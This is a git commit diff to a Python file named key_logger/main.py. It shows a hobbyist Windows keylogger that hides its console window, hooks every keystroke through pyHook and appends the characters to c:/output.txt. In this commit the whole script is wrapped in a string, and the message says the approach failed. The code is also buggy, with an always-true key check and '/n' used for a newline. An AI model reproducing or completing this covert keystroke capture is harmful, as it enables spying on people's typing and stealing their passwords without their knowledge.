a2fda4652fd83d416771f4a7af9228755e632522
rigole <foplacide@gmail.com>
2023-02-07 10:28:45 +0100

    first approach usng pyhook wasn't successfull so I will try an other approach

--- key_logger/main.py
+++ key_logger/main.py
@@ -1,7 +1,8 @@
+"""
 import win32api
 import win32console
 import win32gui
-import pythoncom
+import pythoncom, pyHook
 
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
@@ -11,3 +12,26 @@ def OnKeyboardEvent(event):
         _exit(1)
     if event.Ascii !=0 or 8:
          file = open('c:/output.txt', 'r+')
+         buffer = file.read()
+         file.close()
+         
+         
+         file = open('c:/output.txt', 'r+')
+         keylogs = chr(event.Ascii)
+         if event.Ascii == 13:
+             keylogs = "/n"
+             buffer += keylogs
+             file.write(buffer)
+             file.close()
+             
+hm = pyHook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+
+hm.HookKeyboard()
+
+pythoncom.PumpMessages()
+
+ """
+ 
+       
+             
